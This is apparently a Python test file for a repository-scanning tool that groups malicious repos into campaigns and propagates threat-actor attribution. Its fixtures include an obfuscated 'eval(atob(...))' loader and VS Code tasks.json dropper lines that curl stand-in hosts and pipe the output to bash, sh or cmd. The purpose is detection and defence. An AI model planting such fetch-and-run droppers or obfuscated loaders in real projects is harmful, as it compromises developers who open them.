"""Tests for campaign correlation + threat-actor attribution by shared payload."""

from __future__ import annotations

import json

from conftest import utcnow

from git_warden.correlate import (
    campaign_id,
    campaign_index,
    campaign_key,
    campaigns,
    dropper_key,
    payload_key,
    propagate_campaign_attribution,
)
from git_warden.db import Database
from git_warden.enums import DetectionMethod, RepoFindingStatus
from git_warden.models import RepoFinding

_STUB = "Z2xvYmFs" * 13  # 104 base64 chars -> longer than the loader-stub window


def _ev(tail: str) -> dict:
    return {"bash_findings": [{"file": "postcss.config.js", "line": 1,
                              "category": "obfuscation", "rule": "eval-decoded",
                              "snippet": f"eval(atob('{_STUB}{tail}'))"}]}


def test_payload_key_fingerprints_shared_stub_not_the_tail():
    # Same loader stub, different tails (different embedded C2) -> SAME campaign key.
    assert payload_key(json.dumps(_ev("AAAA"))) == payload_key(json.dumps(_ev("ZZZZ")))
    # No atob literal (dynamic loader) -> None, so it never joins a campaign.
    assert payload_key(json.dumps({"bash_findings": [
        {"snippet": "eval(atob(process.env.X));", "rule": "eval-decoded"}]})) is None
    # Too short to be the stub -> None.
    assert payload_key(json.dumps({"bash_findings": [{"snippet": "eval(atob('QUJD'))"}]})) is None


def test_propagate_spreads_attribution_across_the_campaign(tmp_path):
    db = Database.open(tmp_path / "c.sqlite")
    db.start_run("r1", utcnow())
    # Three repos, same loader stub; only the first is tagged (e.g. via OSM).
    for nm, tail in (("a/src", "AAAA"), ("b/src", "BBBB"), ("c/src", "CCCC")):
        db.upsert_finding(RepoFinding(
            full_name=nm, detection_method=DetectionMethod.SIGNATURE_MATCH,
            status=RepoFindingStatus.CONFIRMED, raw_payload=_ev(tail)), "r1")
    db.ensure_actor("DPRK (per test)", "DPRK", "nation-state", "r1")
    db.set_attribution("a/src", "DPRK (per test)")

    res = propagate_campaign_attribution(db, "r1")
    assert res == {"campaigns": 1, "attributed": 2, "clusters": 1}   # b/src, c/src
    assert db.get_finding("b/src")["actor_key"] == "DPRK (per test)"
    assert db.get_finding("c/src")["actor_key"] == "DPRK (per test)"


def test_propagate_does_not_invent_attribution(tmp_path):
    # A campaign with NO attributed member stays unattributed (never fabricated).
    db = Database.open(tmp_path / "c.sqlite")
    db.start_run("r1", utcnow())
    for nm, tail in (("a/src", "AAAA"), ("b/src", "BBBB")):
        db.upsert_finding(RepoFinding(
            full_name=nm, detection_method=DetectionMethod.SIGNATURE_MATCH,
            status=RepoFindingStatus.CONFIRMED, raw_payload=_ev(tail)), "r1")
    assert propagate_campaign_attribution(db, "r1") == {
        "campaigns": 0, "attributed": 0, "clusters": 1}
    db.close()


# --- Dropper-shape campaigns (rotating-C2 tasks.json lures) -------------------


def _task(host: str, flag: str = "606") -> dict:
    blob = (f"curl -s 'https://{host}/settings/mac?flag={flag}' | bash "
            f"curl 'https://{host}/settings/linux?flag={flag}' | sh "
            f"curl https://{host}/settings/windows?flag={flag} | cmd")
    return {"bash_findings": [{"file": ".vscode/tasks.json", "line": 0,
                              "category": "install_hook", "rule": "vscode-autorun",
                              "snippet": blob}]}


def test_dropper_key_survives_host_rotation_and_flag_values():
    a = dropper_key(json.dumps(_task("vscode-settings-config.vercel.app", "606")))
    b = dropper_key(json.dumps(_task("default-configuration.vercel.app", "11")))
    assert a == b == "vscode-folderopen:settings/{os}?flag="
    assert campaign_key(json.dumps(_task("x.vercel.app"))) == f"dropper:{a}"


def test_dropper_key_ignores_reputable_installers_and_non_droppers():
    rustup = {"bash_findings": [{"rule": "curl_pipe_sh", "snippet":
             "curl https://sh.rustup.rs/install?channel=stable | sh"}]}
    assert dropper_key(json.dumps(rustup)) is None
    # A URL with a query but no fetch-to-shell context is not a dropper.
    doc = {"bash_findings": [{"rule": "readme", "snippet":
           "see https://evil.example/settings/linux?flag=1 for details"}]}
    assert dropper_key(json.dumps(doc)) is None


def test_payload_fingerprint_wins_over_dropper():
    assert campaign_key(json.dumps(_ev("AAAA"))).startswith("payload:")


def _confirm(db, name: str, payload: dict, status=RepoFindingStatus.CONFIRMED):
    db.upsert_finding(RepoFinding(
        full_name=name, detection_method=DetectionMethod.SIGNATURE_MATCH,
        status=status, raw_payload=payload), "r1")


def test_campaign_index_groups_rotating_hosts_across_owners(tmp_path):
    db = Database.open(tmp_path / "c.sqlite")
    db.start_run("r1", utcnow())
    _confirm(db, "ta3pks/social", _task("one.vercel.app"))
    _confirm(db, "lfirsl/morphix", _task("two.vercel.app", "7"))
    _confirm(db, "crazydev13/school", _task("three.vercel.app", "9"))
    _confirm(db, "loner/repo", {"bash_findings": [{"rule": "curl_pipe_sh", "snippet":
             "curl https://solo.example/a/b?k=1 | sh"}]})
    _confirm(db, "cand/repo", _task("four.vercel.app"), RepoFindingStatus.CANDIDATE)

    idx = campaign_index(db)
    assert set(idx) == {"ta3pks/social", "lfirsl/morphix", "crazydev13/school"}
    camp = idx["lfirsl/morphix"]
    assert camp.kind == "dropper"
    assert camp.id == campaign_id(camp.key) and camp.id.startswith("GW-C-")
    assert camp.owners == {"ta3pks", "lfirsl", "crazydev13"}
    assert camp.c2_hosts == {"one.vercel.app", "two.vercel.app", "three.vercel.app"}
    assert "settings/mac?flag=" in camp.snippet
    assert [c.id for c in campaigns(db)] == [camp.id]
    db.close()


def test_dropper_campaigns_never_spread_attribution_but_are_recorded(tmp_path):
    db = Database.open(tmp_path / "c.sqlite")
    db.start_run("r1", utcnow())
    _confirm(db, "a/x", _task("one.vercel.app"))
    _confirm(db, "b/y", _task("two.vercel.app"))
    db.ensure_actor("DPRK (per test)", "DPRK", "nation-state", "r1")
    db.set_attribution("a/x", "DPRK (per test)")

    res = propagate_campaign_attribution(db, "r1")
    assert res == {"campaigns": 0, "attributed": 0, "clusters": 1}
    assert db.get_finding("b/y")["actor_key"] is None   # shape is weaker than payload
    rows = db.conn.execute(
        "SELECT campaign_id, fingerprint, full_name, first_seen_run FROM campaign_members "
        "ORDER BY full_name").fetchall()
    assert [r["full_name"] for r in rows] == ["a/x", "b/y"]
    assert rows[0]["fingerprint"] == "dropper:vscode-folderopen:settings/{os}?flag="
    assert rows[0]["first_seen_run"] == "r1"

    db.start_run("r2", utcnow())
    propagate_campaign_attribution(db, "r2")
    row = db.conn.execute("SELECT first_seen_run, last_seen_run FROM campaign_members "
                          "WHERE full_name = 'a/x'").fetchone()
    assert (row["first_seen_run"], row["last_seen_run"]) == ("r1", "r2")
    db.close()
